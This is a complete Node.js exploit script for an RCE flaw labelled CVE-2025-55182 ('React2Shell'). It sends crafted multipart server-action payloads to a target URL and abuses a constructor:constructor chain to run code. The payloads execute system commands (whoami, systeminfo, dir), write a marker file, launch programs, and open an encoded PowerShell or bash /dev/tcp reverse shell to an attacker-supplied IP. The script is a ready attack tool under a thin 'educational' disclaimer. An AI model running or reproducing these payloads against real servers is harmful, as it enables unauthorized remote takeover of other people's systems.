// CVE-2025-55182 - React2Shell Exploit
// Educational purposes only - Use at your own risk

const FormDataLib = require('form-data');

// Payload generators
function createBasicPayload() {
    return {
        '0': '$1',
        '1': {
            'status': 'resolved_model',
            'reason': 0,
            '_response': '$4',
            'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            'then': '$2:then'
        },
        '2': '$@3',
        '3': [],
        '4': {
            '_prefix': 'console.log("EXPLOITED: " + (7*7+1))//',
            '_formData': {
                'get': '$3:constructor:constructor'
            },
            '_chunks': '$2:_response:_chunks',
        }
    };
}

function createWhoamiPayload() {
    return {
        '0': '$1',
        '1': {
            'status': 'resolved_model',
            'reason': 0,
            '_response': '$4',
            'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            'then': '$2:then'
        },
        '2': '$@3',
        '3': [],
        '4': {
            '_prefix': 'console.log(global.process.mainModule.require("child_process").execSync("whoami").toString())//',
            '_formData': {
                'get': '$3:constructor:constructor'
            },
            '_chunks': '$2:_response:_chunks',
        }
    };
}

function createDirPayload() {
    return {
        '0': '$1',
        '1': {
            'status': 'resolved_model',
            'reason': 0,
            '_response': '$4',
            'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            'then': '$2:then'
        },
        '2': '$@3',
        '3': [],
        '4': {
            '_prefix': 'console.log(global.process.mainModule.require("child_process").execSync("dir").toString())//',
            '_formData': {
                'get': '$3:constructor:constructor'
            },
            '_chunks': '$2:_response:_chunks',
        }
    };
}

function createSystemInfoPayload() {
    return {
        '0': '$1',
        '1': {
            'status': 'resolved_model',
            'reason': 0,
            '_response': '$4',
            'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            'then': '$2:then'
        },
        '2': '$@3',
        '3': [],
        '4': {
            '_prefix': 'console.log(global.process.mainModule.require("child_process").execSync("systeminfo").toString())//',
            '_formData': {
                'get': '$3:constructor:constructor'
            },
            '_chunks': '$2:_response:_chunks',
        }
    };
}

function createFileProofPayload() {
    return {
        '0': '$1',
        '1': {
            'status': 'resolved_model',
            'reason': 0,
            '_response': '$4',
            'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            'then': '$2:then'
        },
        '2': '$@3',
        '3': [],
        '4': {
            '_prefix': 'global.process.mainModule.require("fs").writeFileSync("EXPLOITED.txt","Compromised via CVE-2025-55182 at "+new Date().toISOString());console.log("File created: EXPLOITED.txt")//',
            '_formData': {
                'get': '$3:constructor:constructor'
            },
            '_chunks': '$2:_response:_chunks',
        }
    };
}

function createCalcPayload() {
    return {
        '0': '$1',
        '1': {
            'status': 'resolved_model',
            'reason': 0,
            '_response': '$4',
            'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            'then': '$2:then'
        },
        '2': '$@3',
        '3': [],
        '4': {
            '_prefix': 'global.process.mainModule.require("child_process").spawn("calc.exe",{detached:true,stdio:"ignore"}).unref();console.log("Calculator launched")//',
            '_formData': {
                'get': '$3:constructor:constructor'
            },
            '_chunks': '$2:_response:_chunks',
        }
    };
}

function createNotepadPayload() {
    return {
        '0': '$1',
        '1': {
            'status': 'resolved_model',
            'reason': 0,
            '_response': '$4',
            'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            'then': '$2:then'
        },
        '2': '$@3',
        '3': [],
        '4': {
            '_prefix': 'global.process.mainModule.require("child_process").spawn("notepad.exe",{detached:true,stdio:"ignore"}).unref();console.log("Notepad launched")//',
            '_formData': {
                'get': '$3:constructor:constructor'
            },
            '_chunks': '$2:_response:_chunks',
        }
    };
}

function createReverseShellPayload(attackerIP, port) {
    const isWindows = `(process.platform==="win32")`;

    const psCommand = `$c=New-Object System.Net.Sockets.TCPClient('${attackerIP}',${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sb=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()`;
    const winPayload = Buffer.from(psCommand, 'utf16le').toString('base64');

    const bashCommand = `bash -i >& /dev/tcp/${attackerIP}/${port} 0>&1`;
    const bashPayloadB64 = Buffer.from(bashCommand).toString('base64');

    return {
        '0': '$1',
        '1': {
            'status': 'resolved_model',
            'reason': 0,
            '_response': '$4',
            'value': '{"then":"$3:map","0":{"then":"$B3"},"length":1}',
            'then': '$2:then'
        },
        '2': '$@3',
        '3': [],
        '4': {
            '_prefix': `(function(){var cp=global.process.mainModule.require("child_process");if(${isWindows}){cp.exec("powershell -EncodedCommand ${winPayload}")}else{cp.exec("echo ${bashPayloadB64}|base64 -d|bash")}console.log("Shell executed for "+process.platform)})()//`,
            '_formData': {
                'get': '$3:constructor:constructor'
            },
            '_chunks': '$2:_response:_chunks',
        }
    };
}

// Main exploit function
async function exploit(baseUrl, payloadType = 'basic', options = {}) {
    let payload;

    switch(payloadType) {
        case 'basic':
            payload = createBasicPayload();
            console.log('[*] Payload: basic (proof of concept)');
            break;
        case 'whoami':
            payload = createWhoamiPayload();
            console.log('[*] Payload: whoami');
            break;
        case 'dir':
            payload = createDirPayload();
            console.log('[*] Payload: dir');
            break;
        case 'systeminfo':
            payload = createSystemInfoPayload();
            console.log('[*] Payload: systeminfo');
            break;
        case 'file':
            payload = createFileProofPayload();
            console.log('[*] Payload: file proof (EXPLOITED.txt)');
            break;
        case 'calc':
            payload = createCalcPayload();
            console.log('[*] Payload: launch calculator');
            break;
        case 'notepad':
            payload = createNotepadPayload();
            console.log('[*] Payload: launch notepad');
            break;
        case 'shell':
            if (!options.ip || !options.port) {
                console.error('[!] Error: shell payload requires IP and PORT');
                return;
            }
            payload = createReverseShellPayload(options.ip, options.port);
            console.log(`[*] Payload: reverse shell to ${options.ip}:${options.port}`);
            console.log('[!] Ensure listener is ready: nc -lvnp ' + options.port);
            break;
        default:
            console.error('[!] Invalid payload type');
            return;
    }

    const fd = new FormDataLib();
    for (const key in payload) {
        fd.append(key, JSON.stringify(payload[key]));
    }

    console.log('[*] Sending malicious request...');

    const timeout = setTimeout(() => {
        console.log('[+] Request sent successfully');
        console.log('[*] Check server console for output');
        process.exit(0);
    }, 3000);

    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 5000);

        const response = await fetch(baseUrl, {
            method: 'POST',
            headers: {
                'next-action': 'x',
                ...fd.getHeaders()
            },
            body: fd.getBuffer(),
            signal: controller.signal
        });

        clearTimeout(timeoutId);
        clearTimeout(timeout);

        console.log('[+] Response status:', response.status);
        const text = await response.text();

        if (response.status === 500) {
            console.log('[!] Server error - check for syntax issues');
        }

        console.log('[+] Response body:');
        console.log(text);
        console.log('\n[+] Exploit completed');
        console.log('[*] Check server console for command output');
        process.exit(0);
    } catch (error) {
        clearTimeout(timeout);
        if (error.name === 'AbortError') {
            console.log('[+] Request timeout - exploit likely executed');
            console.log('[*] Check server console or target system');
        } else {
            console.error('[!] Error:', error.message);
        }
        process.exit(0);
    }
}

// Parse command line arguments
const args = process.argv.slice(2);

if (args.length === 0) {
    console.log('Usage: node react2shell.js <target_url> <payload_type> [options]');
    process.exit(0);
}

const targetUrl = args[0];
const payloadType = args[1] || 'basic';

console.log('[*] Target:', targetUrl);

if (payloadType === 'shell') {
    if (args.length < 4) {
        console.error('[!] Error: shell payload requires IP and PORT');
        process.exit(1);
    }
    exploit(targetUrl, 'shell', { ip: args[2], port: args[3] });
} else {
    exploit(targetUrl, payloadType);
}
